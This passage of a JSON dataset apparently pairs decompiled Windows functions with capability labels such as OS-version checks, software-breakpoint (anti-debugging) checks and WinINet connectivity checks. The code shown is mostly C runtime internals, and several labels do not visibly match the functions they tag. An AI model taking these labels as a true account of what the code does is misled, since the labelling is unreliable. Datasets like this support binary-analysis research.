        "decompiled_code": "\nvoid fcn.004055de(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00404224();\n    if (0 < *(iVar1 + 0x90)) {\n        iVar1 = fcn.00404224();\n        *(iVar1 + 0x90) = *(iVar1 + 0x90) + -1;\n    }\n    return;\n}\n",
        "token_count": 86
    },
    "00405795": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405795(int32_t **arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    uint uVar4;\n    \n    piVar1 = *arg_8h;\n    if (((*piVar1 == -0x1f928c9d) && (piVar1[4] == 3)) &&\n       ((iVar2 = piVar1[5],  iVar2 == 0x19930520 ||\n        (((iVar2 == 0x19930521 || (iVar2 == 0x19930522)) || (iVar2 == 0x1994000)))))) {\n        fcn.00404484();\n        pcVar3 = swi(3);\n        uVar4 = (*pcVar3)();\n        return uVar4;\n    }\n    return 0;\n}\n",
        "token_count": 193
    },
    "00408cb9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __cdecl fcn.00408cb9(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    int32_t *piVar1;\n    uint8_t *puVar2;\n    uint8_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    char *pcVar6;\n    uint uVar7;\n    uint *puVar8;\n    uint var_24h;\n    int32_t var_1ch;\n    uint32_t var_18h;\n    int32_t var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    if (**0x4376d4 == 0) {\n        fcn.0040762e(arg_8h, 1, arg_ch);\n        return arg_8h;\n    }\n    var_ch = 0;\n    var_8h = var_8h & 0xffff0000;\n    puVar2 = *0x4376d4 + 1;\n    uVar5 = **0x4376d4;\n    uVar4 = 0xffffffff;\n    var_1h._0_1_ = 0;\n    if (0x4e < uVar5) {\n        if (uVar5 == 0x4f) {\n            *0x4376d4 = puVar2;\n            fcn.004073c4(\"long \");\n            puVar2 = *0x4376d4;\n            goto code_r0x00408f3a;\n        }\n        if (uVar5 < 0x50) goto code_r0x00408f08;\n        if (uVar5 < 0x54) {\n            uVar4 = uVar5 & 3;\n            *0x4376d4 = puVar2;\n            goto code_r0x00408f47;\n        }\n        if (uVar5 == 0x58) {\n            pcVar6 = \"void\";\n            goto code_r0x00408d1b;\n        }\n        if (uVar5 != 0x5f) goto code_r0x00408f08;\n        uVar3 = *puVar2;\n        puVar2 = *0x4376d4 + 2;\n        uVar4 = uVar3;\n        if (uVar4 < 0x4e) {\n            if (uVar4 < 0x4c) {\n                if (uVar4 < 0x48) {\n                    if (uVar4 < 0x46) {\n                        if (uVar4 == 0) {\n                            *0x4376d4 = *0x4376d4 + 1;\n                            fcn.004073f6(1);\n                            goto code_r0x00408f53;\n                        }\n                        if (uVar4 == 0x24) {\n                            *0x4376d4 = puVar2;\n                            uVar7 = fcn.00408cb9(&var_1ch, arg_ch);\n                            fcn.0040760a(arg_8h, \"__w64 \", uVar7);\n                            return arg_8h;\n                        }\n                        if (1 < uVar4 - 0x44) goto code_r0x00408e6c;\n                        pcVar6 = \"__int8\";\n                    }\n                    else {\n                        pcVar6 = \"__int16\";\n                    }\n                }\n                else if (uVar4 < 0x4a) {\n                    pcVar6 = \"__int32\";\n                }\n                else if (uVar4 < 0x4c) {\n                    pcVar6 = \"__int64\";\n                }\n                else {\ncode_r0x00408e6c:\n                    pcVar6 = \"UNKNOWN\";\n                }\n            }\n            else {\n                pcVar6 = \"__int128\";\n            }\n        }\n        else if (uVar4 == 0x4e) {\n            pcVar6 = \"bool\";\n        }\n        else {\n            if (uVar4 == 0x4f) {\n                uVar4 = 0xfffffffe;\n                *0x4376d4 = puVar2;\n                goto code_r0x00408e8d;\n            }\n            if (uVar4 == 0x52) {\n                pcVar6 = \"<unknown>\";\n            }\n            else {\n                if (uVar4 != 0x57) {\n                    if (1 < uVar4 - 0x58) goto code_r0x00408e6c;\n                    *0x4376d4 = *0x4376d4 + 1;\n                    piVar1 = fcn.00409bfd(&var_14h);\n                    var_14h = *piVar1;\n                    var_10h = piVar1[1];\n                    goto joined_r0x00408e59;\n                }\n                pcVar6 = \"wchar_t\";\n            }\n        }\n        *0x4376d4 = puVar2;\n        fcn.004073c4(pcVar6);\n        goto code_r0x00408f53;\n    }\n    // switch table (11 cases) at 0x40906d\n    switch(uVar5) {\n    case 0x43:\n    case 0x44:\n    case 0x45:\n        pcVar6 = \"char\";\n        break;\n    case 0x46:\n    case 0x47:\n        pcVar6 = \"short\";\n        break;\n    case 0x48:\n    case 0x49:\n        pcVar6 = 0x42e614;\n        break;\n    case 0x4a:\n    case 0x4b:\n        pcVar6 = \"long\";\n        break;\n    case 0x4c:\ncode_r0x00408f08:\n        piVar1 = fcn.00409bfd(&var_24h);\n        var_14h = *piVar1;\n        var_10h = piVar1[1];\n        uVar3 = var_1h;\njoined_r0x00408e59:\n        var_ch = var_14h;\n        var_8h = var_10h;\n        if (var_14h == 0) goto code_r0x00408e5f;\n        goto code_r0x00408f53;\n    case 0x4d:\n        pcVar6 = \"float\";\n        break;\n    default:\ncode_r0x00408f3a:\n        *0x4376d4 = puVar2;\n        fcn.004077f4(\"double\");\ncode_r0x00408f47:\n        uVar3 = var_1h;\n        if (uVar4 != 0xffffffff) {\ncode_r0x00408e8d:\n            var_ch = 0;\n            var_8h = var_8h & 0xffff0000;\n            var_1ch = *arg_ch;\n            var_18h = arg_ch[1];\n            if (uVar4 != 0xfffffffe) {\n                if (*arg_ch == 0) {\n                    if ((uVar4 & 1) == 0) {\n                        if ((uVar4 & 2) != 0) {\n                            fcn.004073c4(\"volatile\");\n                        }\n                    }\n                    else {\n                        fcn.004073c4(\"const\");\n                        if ((uVar4 & 2) != 0) {\n                            fcn.004077f4(\" volatile\");\n                        }\n                    }\n                }\n                fcn.0040ae67(arg_8h, &var_ch, &var_1ch, 0x42dee4);\n                return arg_8h;\n            }\n            var_18h = var_18h | 0x800;\n            fcn.0040ae67(&var_14h, &var_ch, &var_1ch, 0x42dc84);\n            if ((var_10h & 0x800) == 0) {\n                fcn.004077f4(0x42ded0);\n            }\ncode_r0x00408e5f:\n            *arg_8h = var_14h;\n            arg_8h[1] = var_10h;\n            return arg_8h;\n        }\n        goto code_r0x00408f53;\n    }\ncode_r0x00408d1b:\n    *0x4376d4 = puVar2;\n    fcn.004073c4(pcVar6);\n    uVar3 = var_1h;\ncode_r0x00408f53:\n    if (uVar5 == 0x43) {\n        pcVar6 = \"signed \";\n    }\n    else {\n        if (((((uVar5 != 0x45) && (uVar5 != 0x47)) && (uVar5 != 0x49)) && (uVar5 != 0x4b)) &&\n           ((uVar5 != 0x5f ||\n            (((uVar3 != 0x45 && (uVar3 != 0x47)) && ((uVar3 != 0x49 && ((uVar3 != 0x4b && (uVar3 != 0x4d))))))))))\n        goto code_r0x00408fbf;\n        pcVar6 = \"unsigned \";\n    }\n    puVar8 = &var_1ch;\n    fcn.00407048(pcVar6);\n    fcn.00407652(pcVar6, puVar8);\n    var_ch = var_1ch;\n    var_8h = var_18h;\ncode_r0x00408fbf:\n    if (*arg_ch != 0) {\n        puVar8 = &var_1ch;\n        uVar7 = 0x20;\n        fcn.00406fcf(0x20);\n        fcn.00407652(uVar7, puVar8);\n        fcn.004076fc(&var_1ch);\n    }\n    *arg_8h = var_ch;\n    arg_8h[1] = var_8h;\n    return arg_8h;\n}\n",
        "token_count": 2235
    },
    "004146ba": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004146ba(uint8_t *arg_8h, uint8_t **arg_ch, uint arg_10h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    uint unaff_EBX;\n    uint8_t *arg_ch_00;\n    int32_t var_2ch;\n    int32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x435040 ^ &stack0xfffffffc;\n    fcn.0040d9b1(arg_10h);\n    if (arg_ch != NULL) {\n        *arg_ch = arg_8h;\n    }\n    iVar4 = var_2ch;\n    arg_ch_00 = arg_8h;\n    if (arg_8h == NULL) {\n        puVar1 = fcn.00403fac();\n        *puVar1 = 0x16;\n        fcn.00406bf3();\n    }\n    else {\n        while( true ) {\n            if (*(iVar4 + 0x74) < 2) {\n                uVar2 = *(*(iVar4 + 0x90) + *arg_ch_00 * 2) & 8;\n            }\n            else {\n                uVar2 = fcn.00414815(*arg_ch_00, 8, &var_2ch);\n                iVar4 = var_2ch;\n            }\n            if (uVar2 == 0) break;\n            arg_ch_00 = arg_ch_00 + 1;\n        }\n        puVar3 = fcn.00419de0(&var_1ch, arg_ch_00, &var_2ch);\n        if (arg_ch != NULL) {\n            *arg_ch = arg_ch_00 + puVar3[1];\n        }\n        if ((*puVar3 & 0x240) == 0) {\n            if ((*puVar3 & 0x81) == 0) {\n                if (((*puVar3 & 0x100) != 0) && (*(puVar3 + 4) == 0.0)) {\n                    puVar1 = fcn.00403fac();\n                    *puVar1 = 0x22;\n                }\n            }\n            else {\n                puVar1 = fcn.00403fac();\n                *puVar1 = 0x22;\n            }\n        }\n        else if (arg_ch != NULL) {\n            *arg_ch = arg_8h;\n        }\n    }\n    if (var_20h != '\\0') {\n        *(var_24h + 0x70) = *(var_24h + 0x70) & 0xfffffffd;\n    }\n    fcn.004023ff(unaff_EBX);\n    return;\n}\n",
        "token_count": 640
    },
    "0041258a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041258a(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_8h_00;\n    \n    if (*0x4377a8 == 0) {\n        arg_8h_00 = 0x435ab0;\n    }\n    else {\n        arg_8h_00 = 0;\n    }\n    fcn.004122fa(arg_8h_00, arg_8h, arg_ch, arg_10h, 0);\n    return;\n}\n",
        "token_count": 119
    },
    "004125ea": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004125ea(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_8h_00;\n    \n    if (*0x4377a8 == 0) {\n        arg_8h_00 = 0x435ab0;\n    }\n    else {\n        arg_8h_00 = 0;\n    }\n    fcn.004122fa(arg_8h_00, arg_8h, arg_ch, arg_10h, 1);\n    return;\n}\n",
        "token_count": 118
    },
    "0041a6a1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_44h\n\nvoid __cdecl fcn.0041a6a1(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    uint8_t uVar3;\n    bool bVar4;\n    bool bVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint8_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    uint *puVar13;\n    int32_t iVar14;\n    int32_t iVar15;\n    uint32_t uVar16;\n    uint32_t uVar17;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uint var_1ch;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x435040 ^ &stack0xfffffffc;\n    uVar1 = arg_8h[5];\n    iVar14 = 0;\n    uVar10 = uVar1 & 0x7fff;\n    uVar16 = *(arg_8h + 3);\n    iVar11 = uVar10 - 0x3fff;\n    var_10h = uVar16;\n    uVar17 = *(arg_8h + 1);\n    var_ch = uVar17;\n    uVar2 = *arg_8h;\n    var_8h = uVar2 << 0x10;\n    uVar3 = str.5_v_[1];\n    if (iVar11 == -0x3fff) {\n        iVar15 = 0;\n        iVar11 = 0;\n        do {\n            if ((&var_10h)[iVar11] != 0) {\n                var_10h = 0;\n                var_ch = 0;\n                var_8h = 0;\n                goto code_r0x0041a716;\n            }\n            iVar11 = iVar11 + 1;\n        } while (iVar11 < 3);\n    }\n    else {\n        iVar6 = str.5_v_[0] + L'\\xffffffff';\n        bVar5 = false;\n        iVar15 = (str.5_v_[0] >> 0x1f & 0x1fU) + str.5_v_[0] >> 5;\n        uVar8 = 0x1f - (str.5_v_[0] & 0x1f);\n        if (((&var_10h)[iVar15] & 1 << (uVar8 & 0x1f)) != 0) {\n            uVar7 = (&var_10h)[iVar15] & ~(-1 << (uVar8 & 0x1f));\n            iVar12 = iVar15;\n            while (uVar7 == 0) {\n                iVar12 = iVar12 + 1;\n                if (2 < iVar12) goto code_r0x0041a816;\n                uVar7 = (&var_10h)[iVar12];\n            }\n            iVar12 = (iVar6 >> 0x1f & 0x1fU) + iVar6 >> 5;\n            bVar5 = false;\n            uVar7 = 1 << (0x1f - (iVar6 & 0x1f) & 0x1f);\n            uVar9 = uVar7 + (&var_10h)[iVar12];\n            bVar4 = false;\n            if ((uVar9 < (&var_10h)[iVar12]) || (uVar9 < uVar7)) {\n                bVar4 = true;\n                bVar5 = true;\n            }\n            (&var_10h)[iVar12] = uVar9;\n            while ((iVar12 = iVar12 + -1,  -1 < iVar12 && (bVar4))) {\n                bVar4 = false;\n                bVar5 = false;\n                uVar7 = (&var_10h)[iVar12] + 1;\n                if ((uVar7 < (&var_10h)[iVar12]) || (uVar7 == 0)) {\n                    bVar4 = true;\n                    bVar5 = true;\n                }\n                (&var_10h)[iVar12] = uVar7;\n            }\n        }\ncode_r0x0041a816:\n        (&var_10h)[iVar15] = (&var_10h)[iVar15] & -1 << (uVar8 & 0x1f);\n        iVar15 = iVar15 + 1;\n        if (iVar15 < 3) {\n            puVar13 = &var_10h + iVar15;\n            for (iVar12 = 3 - iVar15; iVar12 != 0; iVar12 = iVar12 + -1) {\n                *puVar13 = 0;\n                puVar13 = puVar13 + 1;\n            }\n        }\n        iVar15 = iVar11;\n        if (bVar5) {\n            iVar15 = uVar10 - 0x3ffe;\n        }\n        if (iVar15 < *0x435dfc - str.5_v_[0]) {\n            var_10h = 0;\n            var_ch = 0;\n            var_8h = 0;\n        }\n        else {\n            if (*0x435dfc < iVar15) {\n                if (iVar15 < *0x435df8) {\n                    var_10h = var_10h & 0x7fffffff;\n                    iVar15 = str.5_v_[3] + iVar15;\n                    iVar11 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar8 = uVar3 & 0x1f;\n                    var_20h = 0;\n                    iVar14 = 0;\n                    do {\n                        uVar16 = (&var_10h)[iVar14] >> uVar8 | var_20h;\n                        var_20h = ((&var_10h)[iVar14] & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                        (&var_10h)[iVar14] = uVar16;\n                        iVar14 = iVar14 + 1;\n                    } while (iVar14 < 3);\n                    puVar13 = &var_8h + -iVar11;\n                    iVar14 = 2;\n                    do {\n                        if (iVar14 < iVar11) {\n                            (&var_10h)[iVar14] = 0;\n                        }\n                        else {\n                            (&var_10h)[iVar14] = *puVar13;\n                        }\n                        puVar13 = puVar13 + -1;\n                        iVar14 = iVar14 + -1;\n                    } while (-1 < iVar14);\n                }\n                else {\n                    var_ch = 0;\n                    var_8h = 0;\n                    var_10h = 0x80000000;\n                    iVar11 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar8 = uVar3 & 0x1f;\n                    var_20h = 0;\n                    do {\n                        uVar16 = (&var_10h)[iVar14] >> uVar8 | var_20h;\n                        var_20h = ((&var_10h)[iVar14] & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                        (&var_10h)[iVar14] = uVar16;\n                        iVar14 = iVar14 + 1;\n                    } while (iVar14 < 3);\n                    puVar13 = &var_8h + -iVar11;\n                    iVar14 = 2;\n                    do {\n                        if (iVar14 < iVar11) {\n                            (&var_10h)[iVar14] = 0;\n                        }\n                        else {\n                            (&var_10h)[iVar14] = *puVar13;\n                        }\n                        puVar13 = puVar13 + -1;\n                        iVar14 = iVar14 + -1;\n                    } while (-1 < iVar14);\n                    iVar15 = str.5_v_[3] + *0x435df8;\n                }\n                goto code_r0x0041abc7;\n            }\n            iVar11 = *0x435dfc - iVar11;\n            var_10h = uVar16;\n            iVar15 = iVar11 + (iVar11 >> 0x1f & 0x1fU) >> 5;\n            var_ch = uVar17;\n            var_8h = uVar2 << 0x10;\n            uVar8 = iVar11 & 0x1f;\n            var_20h = 0;\n            do {\n                uVar16 = (&var_10h)[iVar14] >> uVar8 | var_20h;\n                var_20h = ((&var_10h)[iVar14] & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                (&var_10h)[iVar14] = uVar16;\n                iVar14 = iVar14 + 1;\n            } while (iVar14 < 3);\n            puVar13 = &var_8h + -iVar15;\n            iVar11 = 2;\n            do {\n                if (iVar11 < iVar15) {\n                    (&var_10h)[iVar11] = 0;\n                }\n                else {\n                    (&var_10h)[iVar11] = *puVar13;\n                }\n                puVar13 = puVar13 + -1;\n                iVar11 = iVar11 + -1;\n            } while (-1 < iVar11);\n            iVar11 = (str.5_v_[0] >> 0x1f & 0x1fU) + str.5_v_[0] >> 5;\n            uVar8 = 0x1f - (str.5_v_[0] & 0x1f);\n            if (((&var_10h)[iVar11] & 1 << (uVar8 & 0x1f)) != 0) {\n                uVar16 = (&var_10h)[iVar11] & ~(-1 << (uVar8 & 0x1f));\n                iVar14 = iVar11;\n                while (uVar16 == 0) {\n                    iVar14 = iVar14 + 1;\n                    if (2 < iVar14) goto code_r0x0041a9d1;\n                    uVar16 = (&var_10h)[iVar14];\n                }\n                iVar14 = (iVar6 >> 0x1f & 0x1fU) + iVar6 >> 5;\n                uVar16 = 1 << (0x1f - (iVar6 & 0x1f) & 0x1f);\n                bVar5 = false;\n                uVar17 = uVar16 + (&var_10h)[iVar14];\n                if ((uVar17 < (&var_10h)[iVar14]) || (uVar17 < uVar16)) {\n                    bVar5 = true;\n                }\n                (&var_10h)[iVar14] = uVar17;\n                while ((iVar14 = iVar14 + -1,  -1 < iVar14 && (bVar5))) {\n                    bVar5 = false;\n                    uVar16 = (&var_10h)[iVar14] + 1;\n                    if ((uVar16 < (&var_10h)[iVar14]) || (uVar16 == 0)) {\n                        bVar5 = true;\n                    }\n                    (&var_10h)[iVar14] = uVar16;\n                }\n            }\ncode_r0x0041a9d1:\n            (&var_10h)[iVar11] = (&var_10h)[iVar11] & -1 << (uVar8 & 0x1f);\n            iVar11 = iVar11 + 1;\n            if (iVar11 < 3) {\n                puVar13 = &var_10h + iVar11;\n                for (iVar14 = 3 - iVar11; iVar14 != 0; iVar14 = iVar14 + -1) {\n                    *puVar13 = 0;\n                    puVar13 = puVar13 + 1;\n                }\n            }\n            iVar14 = str.5_v_[1] + L'\\x01';\n            iVar11 = iVar14 + (iVar14 >> 0x1f & 0x1fU) >> 5;\n            uVar8 = iVar14 & 0x1f;\n            var_20h = 0;\n            var_34h = 0;\n            do {\n                uVar16 = (&var_10h)[var_34h];\n                (&var_10h)[var_34h] = uVar16 >> uVar8 | var_20h;\n                var_20h = (uVar16 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                var_34h = var_34h + 1;\n            } while (var_34h < 3);\n            puVar13 = &var_8h + -iVar11;\n            iVar14 = 2;\n            do {\n                if (iVar14 < iVar11) {\n                    (&var_10h)[iVar14] = 0;\n                }\n                else {\n                    (&var_10h)[iVar14] = *puVar13;\n                }\n                puVar13 = puVar13 + -1;\n                iVar14 = iVar14 + -1;\n            } while (-1 < iVar14);\n        }\ncode_r0x0041a716:\n        iVar15 = 0;\n    }\ncode_r0x0041abc7:\n    uVar16 = iVar15 << (0x1f - uVar3 & 0x1f) | -((uVar1 & 0x8000) != 0) & 0x80000000 | var_10h;\n    if (str.5_v_[2] == L'@') {\n        arg_ch[1] = uVar16;\n        *arg_ch = var_ch;\n    }\n    else if (str.5_v_[2] == L' ') {\n        *arg_ch = uVar16;\n    }\n    fcn.004023ff(uVar1 & 0x8000);\n    return;\n}\n",
        "token_count": 3229
    },
    "0041ac13": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_44h\n\nvoid __cdecl fcn.0041ac13(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    uint8_t uVar3;\n    bool bVar4;\n    bool bVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint8_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    uint *puVar13;\n    int32_t iVar14;\n    int32_t iVar15;\n    uint32_t uVar16;\n    uint32_t uVar17;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uint var_1ch;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x435040 ^ &stack0xfffffffc;\n    uVar1 = arg_8h[5];\n    iVar14 = 0;\n    uVar10 = uVar1 & 0x7fff;\n    uVar16 = *(arg_8h + 3);\n    iVar11 = uVar10 - 0x3fff;\n    var_10h = uVar16;\n    uVar17 = *(arg_8h + 1);\n    var_ch = uVar17;\n    uVar2 = *arg_8h;\n    var_8h = uVar2 << 0x10;\n    uVar3 = *0x435e1c;\n    if (iVar11 == -0x3fff) {\n        iVar15 = 0;\n        iVar11 = 0;\n        do {\n            if ((&var_10h)[iVar11] != 0) {\n                var_10h = 0;\n                var_ch = 0;\n                var_8h = 0;\n                goto code_r0x0041ac88;\n            }\n            iVar11 = iVar11 + 1;\n        } while (iVar11 < 3);\n    }\n    else {\n        iVar6 = *0x435e18 + -1;\n        bVar5 = false;\n        iVar15 = (*0x435e18 >> 0x1f & 0x1fU) + *0x435e18 >> 5;\n        uVar8 = 0x1f - (*0x435e18 & 0x1f);\n        if (((&var_10h)[iVar15] & 1 << (uVar8 & 0x1f)) != 0) {\n            uVar7 = (&var_10h)[iVar15] & ~(-1 << (uVar8 & 0x1f));\n            iVar12 = iVar15;\n            while (uVar7 == 0) {\n                iVar12 = iVar12 + 1;\n                if (2 < iVar12) goto code_r0x0041ad88;\n                uVar7 = (&var_10h)[iVar12];\n            }\n            iVar12 = (iVar6 >> 0x1f & 0x1fU) + iVar6 >> 5;\n            bVar5 = false;\n            uVar7 = 1 << (0x1f - (iVar6 & 0x1f) & 0x1f);\n            uVar9 = uVar7 + (&var_10h)[iVar12];\n            bVar4 = false;\n            if ((uVar9 < (&var_10h)[iVar12]) || (uVar9 < uVar7)) {\n                bVar4 = true;\n                bVar5 = true;\n            }\n            (&var_10h)[iVar12] = uVar9;\n            while ((iVar12 = iVar12 + -1,  -1 < iVar12 && (bVar4))) {\n                bVar4 = false;\n                bVar5 = false;\n                uVar7 = (&var_10h)[iVar12] + 1;\n                if ((uVar7 < (&var_10h)[iVar12]) || (uVar7 == 0)) {\n                    bVar4 = true;\n                    bVar5 = true;\n                }\n                (&var_10h)[iVar12] = uVar7;\n            }\n        }\ncode_r0x0041ad88:\n        (&var_10h)[iVar15] = (&var_10h)[iVar15] & -1 << (uVar8 & 0x1f);\n        iVar15 = iVar15 + 1;\n        if (iVar15 < 3) {\n            puVar13 = &var_10h + iVar15;\n            for (iVar12 = 3 - iVar15; iVar12 != 0; iVar12 = iVar12 + -1) {\n                *puVar13 = 0;\n                puVar13 = puVar13 + 1;\n            }\n        }\n        iVar15 = iVar11;\n        if (bVar5) {\n            iVar15 = uVar10 - 0x3ffe;\n        }\n        if (iVar15 < *0x435e14 - *0x435e18) {\n            var_10h = 0;\n            var_ch = 0;\n            var_8h = 0;\n        }\n        else {\n            if (*0x435e14 < iVar15) {\n                if (iVar15 < *0x435e10) {\n                    var_10h = var_10h & 0x7fffffff;\n                    iVar15 = *0x435e24 + iVar15;\n                    iVar11 = *0x435e1c + (*0x435e1c >> 0x1f & 0x1fU) >> 5;\n                    uVar8 = uVar3 & 0x1f;\n                    var_20h = 0;\n                    iVar14 = 0;\n                    do {\n                        uVar16 = (&var_10h)[iVar14] >> uVar8 | var_20h;\n                        var_20h = ((&var_10h)[iVar14] & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                        (&var_10h)[iVar14] = uVar16;\n                        iVar14 = iVar14 + 1;\n                    } while (iVar14 < 3);\n                    puVar13 = &var_8h + -iVar11;\n                    iVar14 = 2;\n                    do {\n                        if (iVar14 < iVar11) {\n                            (&var_10h)[iVar14] = 0;\n                        }\n                        else {\n                            (&var_10h)[iVar14] = *puVar13;\n                        }\n                        puVar13 = puVar13 + -1;\n                        iVar14 = iVar14 + -1;\n                    } while (-1 < iVar14);\n                }\n                else {\n                    var_ch = 0;\n                    var_8h = 0;\n                    var_10h = 0x80000000;\n                    iVar11 = *0x435e1c + (*0x435e1c >> 0x1f & 0x1fU) >> 5;\n                    uVar8 = uVar3 & 0x1f;\n                    var_20h = 0;\n                    do {\n                        uVar16 = (&var_10h)[iVar14] >> uVar8 | var_20h;\n                        var_20h = ((&var_10h)[iVar14] & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                        (&var_10h)[iVar14] = uVar16;\n                        iVar14 = iVar14 + 1;\n                    } while (iVar14 < 3);\n                    puVar13 = &var_8h + -iVar11;\n                    iVar14 = 2;\n                    do {\n                        if (iVar14 < iVar11) {\n                            (&var_10h)[iVar14] = 0;\n                        }\n                        else {\n                            (&var_10h)[iVar14] = *puVar13;\n                        }\n                        puVar13 = puVar13 + -1;\n                        iVar14 = iVar14 + -1;\n                    } while (-1 < iVar14);\n                    iVar15 = *0x435e24 + *0x435e10;\n                }\n                goto code_r0x0041b139;\n            }\n            iVar11 = *0x435e14 - iVar11;\n            var_10h = uVar16;\n            iVar15 = iVar11 + (iVar11 >> 0x1f & 0x1fU) >> 5;\n            var_ch = uVar17;\n            var_8h = uVar2 << 0x10;\n            uVar8 = iVar11 & 0x1f;\n            var_20h = 0;\n            do {\n                uVar16 = (&var_10h)[iVar14] >> uVar8 | var_20h;\n                var_20h = ((&var_10h)[iVar14] & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                (&var_10h)[iVar14] = uVar16;\n                iVar14 = iVar14 + 1;\n            } while (iVar14 < 3);\n            puVar13 = &var_8h + -iVar15;\n            iVar11 = 2;\n            do {\n                if (iVar11 < iVar15) {\n                    (&var_10h)[iVar11] = 0;\n                }\n                else 